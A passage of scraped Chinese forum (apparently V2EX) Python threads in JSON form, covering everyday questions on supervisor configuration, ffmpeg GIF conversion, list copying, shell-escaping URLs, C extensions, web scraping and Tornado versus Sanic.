rooms_queue 也不共享，锁也不共享，你放这有什么用呢。。\r", "为什么最后只有线程 16 在工作？因为它干得最慢啊", "2017 了， async await 都普及到 js 啦。", "明明是个队列需求，就好好用队列库\r", "锁也不会用", " 你的网站挂了", "线程处理任务队列，任务异步执行，多子进程处理任务，子进程统统后台执行。\r", "\r", "如此这般， python 才会真正用到多核 /超线程 处理能力。", " #12 哪个网站？", " #14 .me 的那个。。现在又能访问了，上午说是备案什么的问题。。", " #15 因为被墙了"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>中文资料貌似不是很多</p>\n</div></div>"], "reply": "3", "tittle": "django rest framework 的学习资源有哪些？", "comment": ["这里算是一个吧： ", "直接看源码吧，才几千行，，", " - -，目前正在看，我是想着先用， 然后再用的过程中不理解的就看源码，"]},
{"content": ["<div class=\"topic_content\">感觉怎么样，推荐读吗</div>"], "reply": "14", "tittle": "《 Python 高级编程》这本书有读过的吗", "comment": ["给个链接", " 啊...什么链接,  （你的回复为什么没有提示呢", "书的链接", " \r", " \r", "你们是要下载链接吗，我在图书馆看到的这本书, \r", " 这是我百度上找到的", " 书的信息链接，也就是书的简介，因为叫这个名字的书可能不止一本\r", "不是下载链接。。", "推荐看，第三版英文都出来了，第二版中文已经没卖了", "不知道哎，没听过这本书好像。。。。", " 大概是被降权了。。。", "大学的时候就读过， 很好", "以前看过貌似还行", "作者是谁？", " Tarek Ziadé", "以前公司图书馆看过，内容深度不错，上次看见国内图灵还是异步正在翻译了，过不久就能看了吧", "我只想问问这本书的例子用的是 py2 还是 3 ？\r", "2 的话就不看了。"]},
{"content": ["<div class=\"topic_content\">我想用 nginx 部署 django,之前部署成功了，可以访问。\r<br>后来我改了一些代码，重新 git pull ，于是想用 supervisorctl -c /etc/supervisord.conf restart all 这个命令重启网站。接着就出现问题了，搞了很久，没搞好就把服务器重装系统了，再部署一遍，现在就提示上面的错误。\r<br>具体的错误是：\r<br>xxxx: ERROR (no such file)\r<br>xxxx 是 program 的名字。\r<br>\r<br>supervisord.conf 中的那段新增代码是：\r<br>[program:JZAssist]\r<br>command=-E uwsgi --ini /home/work/xxxx/uwsgi.ini\r<br>directory=/home/work/xxxx\r<br>startsecs=0\r<br>stopwaitsecs=0\r<br>autostart=true\r<br>autorestart=true\r<br>\r<br>uwsgi.ini 中的内容是：\r<br>[uwsgi]\r<br>socket = :8000\r<br>chdir           = /home/work/xxxx\r<br>module          = xxxx.wsgi\r<br>master          = true\r<br>processes       = 4\r<br>vacuum          = true\r<br>\r<br>搜了很久都没解决，不知道有谁遇到过这样的问题？</div>"], "reply": "9", "tittle": "用 supervisor 来管理进程始终报错，错误是 ERROR (no such file)", "comment": ["-E uwsgi --ini /home/work/xxxx/uwsgi.ini \r", "\r", "这是完整的命令？目测少了东西", "类似这样\r", "command = /path/bin --opt", " 命令的部分内容在 ini 文件中，我把这命令直接用 sudo 输在 cmd 中可以运行。", "之前我也是这样配置的，都没有问题。不知道是哪个步骤错了。", "我不知道我做了什么，现在好像没问题了。", "我不知道我做了什么，现在又出现上面的错误了。", "你 command 肯定写错了，自己检查下", "有用 virtualenv 吗？", "确实是 command 有问题，我删除了-E 就可以了。。。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>最近在使用 buildbot ，感觉超赞！ <a href=\"http://buildbot.net/\" rel=\"nofollow\">http://buildbot.net/</a> , 很多开源软件都在用，推荐大家试一下，太强大了（虽然问题也有)</p>\n<p>顺便用 python 包装测试步骤，只能说太流畅太流畅。</p>\n<p>不得不说 python 社团实在太强大了，虽然有时候包的质量有点不达标，但是用起来真是超级赞！</p>\n<p>期待 <a href=\"https://github.com/Microsoft/WinAppDriver\" rel=\"nofollow\">https://github.com/Microsoft/WinAppDriver</a> 能够移植到 windows7 ，那时候用 python 写 UI 测试程序，想想都好强大， Win32 、 MFC 、 WinForm 、 WPF ，各种历史遗产通通测起来。</p>\n<p>在摸索 buildbot 的过程中，长进不少，忍不住跟大家分享。</p>\n</div></div>"], "reply": "1", "tittle": "大家有用自动化集成系统的吗？", "comment": ["感觉 buildbot 太复杂了，造了个轮子： "]},
{"content": ["<div class=\"topic_content\">video 笔误 抱歉~~~</div>"], "reply": "23", "tittle": "把 vedio 比如.mp4 格式的短视频转换为 gif 图 有啥方便的办法么。。查了个 Python 的库 moviepy， but 有个问题需要 fix 才能使用", "comment": ["你这个 vedio 我看了半天", "我 research 下；再 answer 你的 question 。", "moviepy 用的 ffmpeg, imagemagick 为底层,  可以直接在 py 中调用它们的命令行.\r", "moviepy 有啥问题捏?", "我调研一番后， 是直接 python 调 ffmpeg 命令行~", " sorry 写错了。。。", " ", " 这个 demo 报异常", "把 write_gif 的 program 参数改成'ffmpeg'或者'ImageMagick'试试, 默认的的 imageio 不好用,  兼容性似乎也有问题. 不过要另外去下 ffmpeg 或者 imagemagick 安装", "ps", " 恩 感谢  program 使用 ffmpeg 可以正常", "我这儿试了下, 两个都可以用. 转化成 gif imagemagick 要比 ffmpeg 好很多,  ffmpeg 的输出有时很诡异, 画面会花, 使用 imagemagick 的时候要把参数 opt 设置为 optimizeplus 或 OptimizeTransparency, 不然 py 可能卡死. 虽然生成的图会大点, 但是效果很好. 想要精确控制的话还是直接调用相应命令行, 传一摞参数进去, moviepy 只提供了简单功能.", "直接用 ffmpeg ？根据我的经验，凡是视频的东西找它就对了……", "刚刚随手测试了下， ffmpeg 先视频转 dpx 序列帧，再从序列帧转成 gif ，这样 OK 的。\r", "\r", "69M h264 1080p 30fps 视频，转 dpx 序列帧 6.6GB ，转 480p 10fps gif ， 88M\r", "\r", "ffmpeg -i IMG_.MOV dpx/t_%06d.dpx\r", "ffmpeg -y -i dpx/t_%06d.dpx -vf scale=-1:480 -r 10 t.gif\r", "\r", "Orz", "ffmpeg 直接视频转 480p 10fps gif ， gif 74MB\r", "ffmpeg -i IMG.MOV -vf scale=-1:400 -r 10 t.gif\r", "\r", "ffmpeg 直接视频转成 100p 10fps gif ， gif 2.1MB\r", "ffmpeg -y -i IMG.MOV -vf scale=-1:100 -r 10 t.gif\r", "\r", "$ file t.gif\r", "t.gif: GIF image data, version 89a, 178 x 100\r", "\r", "$ du -sh t.gif\r", "2.1M\tt.gif", "  ffmpeg 真是音视频处理的瑞士军刀", "这个？ ", " ？", "又拍云可以定制此功能，需要的话可联系 ", " 客服：）", " 用 imagemagick 看来要设置参数，直接用的话 会一直卡在 0%。。。", " 这个视频转 gif ，一般会选择 10 fps 么，选的过大，造成 gif 太大 无法展示，选择太小又容易失真", " 这个得自己测试了，得看画面动态幅度大小吧... 我尝试用 mediainfo 来检查 gif 文件，发现并无 fps 这个属性。", " 奇怪 我这用 clip.write_gif(\"dog.gif\", program='imagemagick', opt=\"OptimizeTransparency\") 或者 clip.write_gif(\"dog.gif\", program='imagemagick', opt=\"optimizeplus\") python 都会卡死。。。转换的进度一直在 0%", " 不对 是用 ImageMagick", " 使用 ImageMagick 清晰 不过压缩后太大了。。。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>def count():</p>\n<pre><code>fs = []\nfor i in range(1, 4):\n    def f():\n         return i*i\n    fs.append(f)\nreturn fs\n</code></pre>\n<p>f1, f2, f3 = count()</p>\n<p>这个代码中 为什么单独运行 f1=count （）会报错呢 typeerror</p>\n<p>还有就是为什么 f1 ， f2=count （） 也会报错   valueerror</p>\n<p>为什么这 2 个报错还不一样呢</p>\n</div></div>"], "reply": "9", "tittle": "Python 学习中的问题", "comment": ["语法并没有错误，在 Python 3.5 中没有报错。\r", "\r", " ", "f1, f2=count() 这个很好理解\r", "正常来说 f1-3 三个变量，返回值是 3 函数的 list\r", "正好一一对应\r", "现在你只给两个变量，对应不上", " 我是在 python2.7 上运行这个的 单独运行 f1=count （）就报错了", "记得在 Python Cookbook 第一章第一节就是讲的这个例子,  函数返回多值的 Unpacking 问题.\r", "\r", "f1, f2  = .... 这样表示左侧是一个 tuple 要对应于右侧也是一个 tuple/或可转换的结构, 而且长度要求为 2, 否则报 ValueError\r", "\r", "\r", "\r", "若执行 f1=count()  我这里测试也没问题,  结果用 f1[1] f1[2] 访问,  \r", "系统版本是 2.7  (sys.version_info(major=2, minor=7, micro=12, releaselevel='final', serial=0))", "1. 2.7.11 测试不报错。\r", "2. 三个列表是不能平均分给两个变量的。\r", "3. 在循环里重复创建同样的函数真的好吗。。", " 可以加我们的群问，这样效率更高，这个群是一群工程师组建的面向初学者的 python Linux 学习群， qq 群号： 278529278 ，非商业性质，拒绝广告，只接收真正想学这方面技术的朋友，交流学习，申请请说明来自 v2ex", " 错误提示能给一下吗？", " typeerror ：‘ list ’ object is not callalbe", "我怀疑楼主不是用 f1=count()， 而是 f1=count()()"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>闲着没事写了个轻量的远程命令执行的小工具，没什么头绪了，求前辈们给点意见或者方向，地址： <a href=\"https://github.com/tonnie17/flowlight\" rel=\"nofollow\">https://github.com/tonnie17/flowlight</a> ，轻喷...</p>\n</div></div>"], "reply": "7", "tittle": "用 Python 写了个远程执行命令的工具，求建议", "comment": ["问题在哪？", " 我想做成一个方便调试集群的东西，怎么提高在实际开发中的实用性?", "看看 ansible ？", "Fabric 就行了", "多看看轮子 再造轮子", " @", " @", " 感谢各位建议， ansible 和 Fabric 都用过，有很多功能都用不上，其实目的不在于造轮子，而是方便在自己工作上使用，想着封装 paramiko 定制一个更易用的东西", "saltstack 值得看下\r", "\r", "如果还想 hacking , 可以看看 ZeroMQ 的网络编程相关\r", "\r", "btw, 没有头绪，最好先定几个”需求场景”，再去 start coding"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>初学 python3 ， IDE 是 PyCharm ， PHP IDE 是 phpStorm</p>\n<p>在 PHP 中，函数或方法可以加类似这样的注释（ PHPDoc ）</p>\n<pre><code>/**\n* 连接到驱动\n* @param string $host\n* @param string $port\n* @return mixed\n*/\n</code></pre>\n<p>IDE 可以识别并给出相应的提示、补全等，非常方便</p>\n<p>但是在 python 里没有发现有相应的规范</p>\n<p>搜了一下，都是些#单行、三引号多行之类，没有发现有类似 JavaDoc 、 PHPDoc 之类的注释规范，这写起代码来就很蛋疼啊</p>\n<p>是 python 本身的问题吗？还是我没找到？</p>\n</div></div>"], "reply": "17", "tittle": "菜鸡 PHPer 初学 pytho3，想问个关于函数注释的问题", "comment": ["对，自身问题，大家都在乱搞。 pep257 没有强制规定什么。\r", "twisted 用 pydoctor, 个家都有自己的，不过八九不离十，找个靠谱的模仿就行了。", "pycharm 支持好几种的，我用的和你写的 php 注释方法差不多。你可以搜一下 Pycharm type hinting", "谢邀。\r", "三引号写成的注释可以通过 xxx.__doc__的方式获得。", "你看这个吧\r", " #1 原来如此，好吧\r", " #2 感谢你！我就按照 PyCharm 推荐的格式来吧\r", " #3 哈哈哈哈哈哈哈哈神 TM 蟹妖，这 ID 可以的", " #2 按照 4L 文档里的格式写了，然而还是没有提示啥的……我可能用了假的 PyCharm", " 贴上来看看？", "有，你在函数声明下一行输入 \"\"\" 然后回车就行\r", "就和 php 输入 /**然后回车一样", "这是我写的注释\r", " ", "  \r", "\r", "这是调用此函数时 IDE 给出的智能提示……跟没有一样\r", " ", " ", " #8 嗯嗯，我也发现了。目前根据 4L 的文档在学，但是注释写了跟没写一样，没啥效果，参照 9L 。不知道是不是我写的格式有问题", "就是这样的，只会在你写错的时候有提示~在函数的位置按 ctrl Q 才能看见 docstring", " #11 原来如此，感谢回答。刚从 PHP 过来，比较怀念 PHPDoc 的提示 ", " ", " #9 代码第一行改为 def get_info(li : str) -> list:      然后在调用的时候看一下 Pycharm 的提示", " +1\r", "\r", "这种如果调用时填错了类型， pycharm 会直接红线标出来。", "楼主就用三个引号吧，别纠结了，大家都这样用的。 ide 有提示，__doc__也可以获取", " #11 再请问下：我发现 import 好像并不是非要写在文件头的。那是不是当我要用到的时候再 import 这样性能会更好些呢？\r", " #13 \r", " #14 \r", " #15 \r", "感谢，已按照 PyCharm 的帮助文档用上三引号了", " 不是，用到再 import 会带来一些潜在的问题，看看 pep8 ，能清除一些大众的点"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>生成一个矩阵（列表内列表，包括 [[]]），复制内容到另一个变量时，虽然 identity 不同，但是内容更改之后还是会联动</p>\n<pre><code>&gt;&gt;&gt; n = 2\n&gt;&gt;&gt; M = [[0 for _ in range(n)] for _ in range(n)]\n&gt;&gt;&gt; m = list(M)\n&gt;&gt;&gt; m\n[[0, 0], [0, 0]]\n&gt;&gt;&gt; M\n[[0, 0], [0, 0]]\n&gt;&gt;&gt; m[0][0] = 1\n&gt;&gt;&gt; m\n[[1, 0], [0, 0]]\n&gt;&gt;&gt; M\n[[1, 0], [0, 0]]\n&gt;&gt;&gt;\n&gt;&gt;&gt; id(m)-id(M)\n1152\n</code></pre>\n<p>将 <code>m = list(M)</code> 换成 <code>m = M[:]</code> 或者 <code>m = M.copy()</code> 也没用</p>\n<p>不用列表解析式手打也是一样</p>\n<pre><code>&gt;&gt;&gt; M=[[1,2],[]]\n&gt;&gt;&gt; m = M.copy()\n&gt;&gt;&gt; m\n[[1, 2], []]\n&gt;&gt;&gt; M\n[[1, 2], []]\n&gt;&gt;&gt; m[0][0] = 3\n&gt;&gt;&gt; m\n[[3, 2], []]\n&gt;&gt;&gt; M\n[[3, 2], []]\n&gt;&gt;&gt; \n&gt;&gt;&gt; id(m)-id(M)\n960\n</code></pre>\n<p>算法作业查了半个小时才查到这有问题……</p>\n</div></div>", "<div class=\"topic_content\">还是论坛有效率😂每个回帖都有帮助，太感谢了</div>"], "reply": "8", "tittle": "两层的列表好像有个 bug（要么就是我理解有误…）", "comment": ["你需要 m=copy.deepcopy(M)", "```python\r", "In [1]: from copy import deepcopy\r", "\r", "In [2]: m = [[1, 2], []]\r", "\r", "In [3]: M = deepcopy(m)\r", "\r", "In [4]: M\r", "Out[4]: [[1, 2], []]\r", "\r", "In [5]: m\r", "Out[5]: [[1, 2], []]\r", "\r", "In [6]: m[0][0] = 2\r", "\r", "In [7]: m\r", "Out[7]: [[2, 2], []]\r", "\r", "In [8]: M\r", "Out[8]: [[1, 2], []]\r", "\r", "In [9]: n = 2\r", "\r", "In [10]: M = [[0 for _ in range(n)] for _ in range(n)]\r", "\r", "In [11]: m = list(M)\r", "\r", "In [12]: id(m[0]) == id(M[0])\r", "Out[12]: True\r", "```", "是你理解有问题……这样才是对的。", "这样是浅复制，只会复制第一层 list 的元素", "外层 list 的 identity 确实不同，但是内层几个对应位置的 list 的 identity 还是一样的 (", " 感谢，这个好，学习了"]},
{"content": ["<div class=\"topic_content\">大概的场景就是客户端那边给了一个 url ，到了 python 这边，要去调用 linux 的 shell ，做些 curl URL 和 wget  URL 的操作。但是有些 URL 里面带了括号或者一些奇怪的东西。需要转义。感觉用正则太麻烦， 请问各位大佬有什么好办法吗？</div>"], "reply": "17", "tittle": "请教一个关于 url 的问题", "comment": ["只需要 curl 和 wget 的功能的话，几乎都可以用 requests 这个包来实现吧", " 项目里基本都是这么写的..要重构很麻烦", "哦，那转义为啥需要正则？", "不是应该做好 urlencode 然后再调用 shell 的么？(ಠ .̫.̫ ಠ)", " 用双引号包起来，如果 url 有\"就麻烦了。\\就要看哪些需要了，得用正则", "这个是转义，不是正则啊……你可以用三个引号的字符串来写命令，就不用担心双引号问题了", " 感谢", " 不过这样 curl 就没法用了..\r", " 不过这样 curl 就没法用了..", "多了\\", " 为啥没法用了？ curl 空格跟上编码好的 url 不可以么？", " 是的\r", " 什么？", "不给例子吗？\r", "不过问题我看应该解决了，你应该是不了解 urlencode 的事。", "urlencode 两次，或者改成用类似 base64 编码处理一下", " 已解决，感谢。\r", " 两次怎么行..我一位朋友也和我讲过 Base64 ，不过好像不成啊。能给个 demo 吗\r", " 已解决，感谢", "python 调用 shell 为什么要转移？直接传参数列表过去不就好了", "重构还是值得的，毕竟现在你们已经遇到继续往下开发的瓶颈了。\r", "具体做的时候可以用 ", " curl 命令自动转化成 request 的代码。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>有如下一个用 C 写的扩展模块： mytest.\n我的问题是：在 PY 中如何给实参呢？</p>\n<p>#include &lt;stdio.h&gt;</p>\n<p>#include \"Python.h\"</p>\n<p>char* gets_s(char s[],int n)\n{</p>\n<pre><code>int c;\nchar *cs;\nif((cs=s)==NULL) return NULL;    \nwhile(--n&gt;0 &amp;&amp; (c=getc(stdin))!=EOF &amp;&amp; c!='\\n')\n    *cs++=c;\n*cs='\\0';\nreturn (c==EOF &amp;&amp; cs==s) ||(c=='\\n' &amp;&amp; cs==s)? NULL : s ;\n</code></pre>\n<p>}</p>\n<p>static PyObject* mytest_get(PyObject *self, PyObject *args)\n{</p>\n<pre><code>int n;\nchar * s=NULL;\nif(!PyArg_ParseTuple(args, \"si\", &amp;s, &amp;n))\n        return NULL;\nreturn (PyObject*)Py_BuildValue(\"s\", gets_s(s,n));\n</code></pre>\n<p>}</p>\n<p>#python 中：</p>\n<p>import mytest</p>\n<p>from ctypes import *</p>\n<p>arr = (c_byte * 10)()    # c_char*10</p>\n<p>print('input: ')</p>\n<p>mytest.gets_s(arr,10)# TypeError: must be str, not c_byte_Array_10</p>\n<p>//另外在C中如何写这样的导出函数：</p>\n<p>struct demo\n{</p>\n<pre><code>    char name[10];\n    int age;\n};\n</code></pre>\n<p>void GetString(struct demo *p)\n{</p>\n<pre><code>    strcpy(p-&gt;name, \"My Test\");\n    p-&gt;age = 1;\n}\n</code></pre>\n<p>static PyObject* wrap_GetString(PyObject *self, PyObject *args)\n{</p>\n<pre><code>struct demo* s;\n</code></pre>\n<p>if(!PyArg_ParseTuple(args, \"？\", &amp;s)) //这里的类型如何写？</p>\n</div></div>"], "reply": "3", "tittle": "PY 的 C 扩展疑问", "comment": ["这么复杂的东西怎么能三言两语说清楚，楼主去啃啃文档中扩展开发相关的内容吧。", "用 cffi 多简单，为啥要用 CPython 的接口", "第一个问题，从原理上来说， Python 中字符串是不可变的。而根据 C 模块的代码，\"si\"表示接收的是字符串，而 Python 中字符串是不可变的，因此不能像 C 语言中那样先创建一个长度为 10 的空字符串，然后传入函数，在函数中修改其中的内容（这只是原理，你的代码中并没有修改）。因此要么用字符列表，要么就改变思维方式。\r", "\r", "又看了下你的代码，我觉得可以直接使用 input()函数，获取字符串对象，然后传到 C 层面中并解析给一个 const char*对象。如果仅仅想实验一些 C API 的功能，还是要注意 Python 和 C 在思维上的差别。\r", "\r", "PS ：你的 C 代码写的不错啊！看上去是有经验的。\r", "\r", "\r", "第二个问题， Python 中所有都是对象，这个对象在 C 层面指的是 PyObject ，所以从 Python 层面传来的参数不能直接通过`if(!PyArg_ParseTuple(args, \"？\", &s))`解析给 C 层面的纯 struct 对象。\r", "\r", "有几种解决方案：\r", "\r", "1 、弄个中间的结构体，其中含有 PyObject_HEAD ：\r", "\r", "typedef struct {\r", "    PyObject_HEAD\r", "    xxx;\r", "} PyXxxxObject;\r", "\r", "然后将这个对象转成 demo 对象。要么直接把 demo 定义成 PyObject 对象。之后就是传递 O 对象了。\r", "\r", "2 、使用 struct 模块，位于标准库中，不用担心移植性。具体参考相关文档。\r", "\r", "3 、利用 PyDictObject 和 PyListObject 进行一些较为复杂的模拟。应该是可行的，但我没想好细节。就不给出代码了。\r", "\r", "对了，强烈、强烈建议不要混用 ctype 和 Python C API 。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>用 coderunner 插件运行 Python 文件</p>\n<p>UnicodeEncodeError: 'ascii' codec can't encode characters in position 0-3: ordinal not in range(128)\n报错提示这个</p>\n<p>问题是我已经在文件最上面加了</p>\n<h1>-<em>- coding: utf-8 -</em>-</h1>\n<p>而且 vsc 的设置里\nfiles.encoding\": \"utf8\",\n也设置好了</p>\n<p>这是为什么呢？</p>\n</div></div>"], "reply": "6", "tittle": "VSC 写 Python 出现了编码问题", "comment": ["你好，我是插件作者。你 py 文件内容是啥，里面有中文？可以试试这里面的三种解决方案： ", " 好啦好啦！！谢谢谢谢！！！！顺便一提 你的插件好棒的！", " 😀", "Import Io\r", "Io.set …………\r", "原谅我不会手机打代码", " 全球第一工单论坛 😂", "···\r", "import io\r", "sys.stdout = io.TextIOWrapper(sys.stdout.buffer,encoding='utf8') \r", "···"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>最近公司要求爬下 <a href=\"http://www.kuajingjishi.com/Purchase/SearchPurchase#pageIndex=10\" rel=\"nofollow\">http://www.kuajingjishi.com/Purchase/SearchPurchase#pageIndex=10</a> 页面的采购信息，本以为会是比较简单的事情，结果每次爬下来都是第一页的内容</p>\n<pre><code>from selenium import webdriver\n\ndriver = webdriver.PhantomJS()\ndriver.get('http://www.kuajingjishi.com/Purchase/SearchPurchase#pageIndex=2')\nresult = driver.find_element_by_tag_name('table')\nprint(result.get_attribute('innerHTML'))\n</code></pre>\n<p>求助求助~</p>\n</div></div>"], "reply": "6", "tittle": "Python + selenium + phantomjs 求助，爬一个网站的信息", "comment": ["```python\r", "import requests\r", "\r", "data = {\r", "  'X-Requested-With': 'XMLHttpRequest'\r", "}\r", "\r", "for i in range(1,10):\r", "    url='http://www.kuajingjishi.com/Purchase/SearchPurchase?pageIndex={page}'.format(page=i)\r", "    r=requests.post(url,  data=data)\r", "    print(r.text)\r", "```", "它是用 ajax 加载的, 浏览器里用 F12, 选 network 那个 tab, 手动点一下那几个页面, 能看到它发出去的请求, 然后自己一模一样发好了\r", "这个站还没对请求进行验证......orz\r", "\r", "至于为什么 selenium 弄不到......天知道:)\r", "\r", "tips: 在请求上右键->copy->copy as cURL 然后在这个网站能直接转换为 requests 格式 ", " 谢谢你！", " 这个网站好", "pageIndex:9\r", "POST 的时候把这个参数加上就好了，只是一个 AJAX 加载", "python 爬虫只有到完全没办法，反爬实在厉害才用 selenium + phantomjs ，绝大多数情况用 requests 应付就行。"]},
{"content": ["<div class=\"topic_content\">今天看了 google group 看作者考虑以后可能会不支持 2.x 了（ <a target=\"_blank\" href=\"https://groups.google.com/forum/#!msg/python-tornado/uqf0DjxILHc/VwRDS9tcDwAJ\" rel=\"nofollow\">https://groups.google.com/forum/#!msg/python-tornado/uqf0DjxILHc/VwRDS9tcDwAJ</a> ）现在 python3 应该学习了吗？</div>", "<div class=\"topic_content\"><div class=\"markdown_body\"><p></p><h5>得到作者明确的回答了</h5><p></p>\n<blockquote>\n<blockquote>\n<p>Tornado 4.5 and 5.0 will support both python 2 and python 3. I think we're still a few years away from dropping python 2.</p>\n</blockquote>\n</blockquote>\n<p>Ben还是会继续支持Python 2 消灭到2还需要一些时间</p>\n</div></div>"], "reply": "47", "tittle": "tornado 貌似 4.5+考虑放弃维护 Python 2.x 了", "comment": ["挺好的，滋次，下一步上 asyncio 就行了", " 后面异步不再是用 feature 来模拟了，而是原生的 asyncio", "最近一直关注 Sanic  ", "   比 tornado 生态貌似好些", "2.7 将在 2020 年终止维护了~", " 好在哪里能不能介绍一下？", " 基于 python3.5", " \r", " 不小心就回车了，基于 python3.5 ，基于 uvloop 的实现，用法几乎就是 flask ，习惯 flask 的人，直接上手，看开发也很活跃，然后速度号称还是比较有优势的。", " 体验了一下感觉速度很牛啊，比 tornado 快的多而且够轻量", " sanic 那个 json 序列化的函数居然就叫 json ，和标准库的包名都冲突了，直接路人转黑", " 看了下，不支持 win 系？", " 可以用 as 转移嘛", "支持", " 强迫症表示不能忍", "python 还好啦， 2 和 3 语法差别不是很大，学习成本不是很大。要是 Angular 和 Angular2 的话就要哭了", " 可以写 from sanic import response;  requests.json, 不要直接 from sanic.request import json", " 不 import 到当前 namespace 就没事，直接 import as 也可以（ flask 还有 flask.json 呢）", " \r", " \r", "我知道有许多方法可以解决掉这个问题，但 sanic 的这种命名方式显然是不够优雅的，这是创造了一个本来不会存在的问题\r", "Simple is better than complex.", "话说跑题了喂，不应该讨论 tornado 的么= =", "建议学习 Python3 , 支持已经很广泛。\r", "\r", "btw:\r", "\r", "1. tornado 框架我认为很有特点的一个方面：在于 RequestHandler 是 Class 类型，用到了 Python 的面向对象优势。\r", "\r", "2. 如果追求速率， golang 开发 http api 的应用情景越来越多", "django 2 也要放弃支持 Python2 了", "挺想换的，但是之前在 tornado 下写了很多很多可以复用的类…改起来工作量不小", "到了 2020 年，我用不用 python 还不知道呢。。\r", "我觉得对于 python 异步而已，主要没有框架异步(tornado)+orm 异步(?)+template 异步(?)+redis 异步(?)一条龙，所以我现在宁愿用 flask 。。反正并发不是很高", "ben 改决定了，他认为还需要几年才能放弃 Python2 ， 4.5 乃至 5.0 都还会是兼容 Python2 、 Python3 。", "其实如果抛弃 2 的支持是好事啊，现在除了老项目谁还用 2 ？\r", "\r", "隔壁的 aiohttp 搞的风生水起，很大一个原因就是没有包袱。", "除去 rhel6 还在 2.6 ，其他发行版的默认 python 都还是 2.7 吧，即使是安装有 3.x\r", "期待第一个默认 3.x 的发行版出现，这样才算是吹响消灭 2.7 的号角", " tornado 相关的一部支持还是比较好，该有的都有， tornado 自带长连接", " 个人还是喜欢 Tornado 风格，代码利用率高", " py2 你用什么 orm? wtform 有异步库吗？ jinja2 有异步库吗", " ORM 我用 SQLAlchemy ， 你说这两个库本质是表单渲染只要 handler 是异步就可以了，不知道字符串异步替换有什么好处", "你 SQLAlchemy 怎么异步法？不会是用 tornado-celery 那种方式吧", " 可以指定 tornado-mysql 的驱动啊....", " Arch 多年前就切了， Arch 的这个行为当年直接导致了一个阐明默认 Python 版本选择方式的 PEP 出现", " 但是官方不推荐你异步操作", " 。。。。", " 还真有啊，这个发行版还真没用过", "sanic 和 Flask 语法简直一模一样，迁移太方便了。不过貌似部署这块比较初级，还没有 graceful reload", " tornado 不是也没有 gracefully reload 吗？", "Sanic 列出的 benchmark ， Tornado 的 rps 也太惨了吧。。。\r", "果然 pure python 不太给力啊。。。", " 等 4.5 版本切换到 asyncio 上就可能好多了", " tornado 在 pypy 上跟开了挂一样", "最近试用了 Sanic 感觉还是存在很多问题，得自己去填坑。", " 有什么问题能说一下么？最近打算把 sanic 用到生产商", " 我用 Flask 比较多，所以没有注意 tornado 这块，不过我看网上还是有些解决方案的", " 目前发现的两个问题：\r", "\r", "1. 它自己的 logging 用得不太对\r", "2. 请求出现异常的时候 request 对象可能是 None ，日志会非常难 debug", " 。。。我确定你需要去看看 sanic 源码", " 粗略的看来一下 Sanic 的源码, 代码质量和 Tornado 相差甚远.", " 对啊，没有标准的方法。有 hack 的方法，不完美。"]},
{"content": ["<div class=\"topic_content\"><a target=\"_blank\" href=\"https://github.com/Tinche/aiofiles\" rel=\"nofollow\">https://github.com/Tinche/aiofiles</a>\r<br>今天蛋疼的看了一眼，发现它把文件操作扔到 asnycio 里面，但是文件的读写模式仍然是 block 的。搞不懂这么干到底有什么意义。我是 python 小白，还请指教一下。</div>"], "reply": "8", "tittle": "aiofiles 这个库意义何在？", "comment": ["不就是封装一个线程池吗？这个不会堵塞主线程，就是这样", " ，对 asyncio 不太了解，我猜测它是用了一个单独线程执行所有协程工作。这样有大量文件 IO 时应该并没有带来多大好处，不过是把阻塞放到另一个线程了。我觉得这个库应该使用 epoll 类的异步 API ，才能完全发挥 asyncio 的优势，但是看看代码好像并没有。", " epoll 不支持本地 IO,非堵塞只是指不堵塞主线程，除非 Windows ，要不然你要完全用户态线程不堵塞是做不到的，那需要的是异步 IO 接口，内核不支持都没有用", " POSIX 不是有 aio 么\r", " 用的是 coroutine 。但是不会阻塞啊。非阻塞的方法有很多， select poll aio 都行", " epoll 在这里确实不适合，见笑了\r", " coroutine 里面调用系统的阻塞 API ，还是要阻塞的吧。我觉得这个库应该用你说的这几个非阻塞 API ，但翻了半天代码它的确是用的最普通的阻塞方法。", "你到 stackoverflow 搜搜文件异步 io 的实现方式，线程池是比较简单方便而且平台兼容性比较好的做法。", " 现在的 aio 都是线程实现的。。。", "感觉没什么意义, 之前测试了一下, 读 100 个文件, aiofiles 比普通的方式还要更慢"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>1 、 MACD 指标</p>\n<p>MACD 称为指数平滑移动平均线，是从双指数移动平均线发展而来的，由快的指数移动平均线（ EMA12 ）减去慢的指数移动平均线（ EMA26 ）得到快线 DIF ，再用 2×（快线 DIF-DIF 的 9 日加权移动均线 DEA ）得到 MACD 柱。 MACD 的意义和双移动平均线基本相同，即由快、慢均线的离散、聚合表征当前的多空状态和股价可能的发展变化趋势，但阅读起来更方便。当 MACD 从负数转向正数，是买的信号。当 MACD 从正数转向负数，是卖的信号。当 MACD 以大角度变化，表示快的移动平均线和慢的移动平均线的差距非常迅速的拉开，代表了一个市场大趋势的转变。</p>\n<p>公式：</p>\n<p>12 日 EMA 的计算：</p>\n<p>EMA （ 12 ） = 前一日 EMA （ 12 ） X 11/13 + 今日收盘价 X 2/13</p>\n<p>26 日 EMA 的计算：</p>\n<p>EMA （ 26 ） = 前一日 EMA （ 26 ） X 25/27 + 今日收盘价 X 2/27</p>\n<p>差离值（ DIF ）的计算：</p>\n<p>DIF = EMA （ 12 ） - EMA （ 26 ） 。</p>\n<p>根据差离值计算其 9 日的 EMA ，即离差平均值，是所求的 DEA 值。为了不与指标原名相混淆，此值又名 DEA 或 DEM 。\n　　今日 DEA = （前一日 DEA X 8/10 + 今日 DIF X 2/10 ）</p>\n<p>用（ DIF-DEA ）*2 即为 MACD 柱状图。</p>\n<p>简易实现代码：\nclass Myclass extends BackTestTradingStrategy{\nString stock = \"sha-601318\";\nMACDFactor macdFactor = new  MACDFactor();\nvoid init(BackTestContext context){<br>\nuniverse.add(stock);\n}//end of init</p>\n<p>void handleData(BackTestContext context,BarData data){\ndouble macd = 